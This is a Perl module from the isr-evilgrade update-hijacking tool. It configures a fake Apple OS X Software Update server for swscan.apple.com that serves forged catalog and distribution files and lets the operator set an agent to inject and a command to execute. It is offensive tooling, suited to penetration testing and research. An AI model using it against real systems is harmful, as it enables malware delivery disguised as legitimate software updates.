###############
# osx.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::osx;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'Apple OS X Software',
    'version'     => '1.0',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'swscan.apple.com',
    'request'     => [
        {   'req'    => '\.sucatalog$',    #regex friendly
            'type'   => 'file',            #file|string|agent|install
            'method' => '',                #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/osx/osx_catalog.xml'
        },
        {   'req'    => '\.dist$',         #regex friendly
            'type'   => 'file',            #file|string|agent|install
            'method' => '',                #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/osx/osx_agent.xml'
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
        'pkey' => {
            'val' =>
                'isrcore::utils::RndNum(3)."-".isrcore::utils::RndNum(4)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'fname' => {
            'val'     => 'isrcore::utils::RndAlpha(10)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'update' => {
            'val'     => 'isrcore::utils::RndAlpha(10)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'cmd' => {
            'val'  => '/bin/ls',
            'desc' => 'command to execute'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
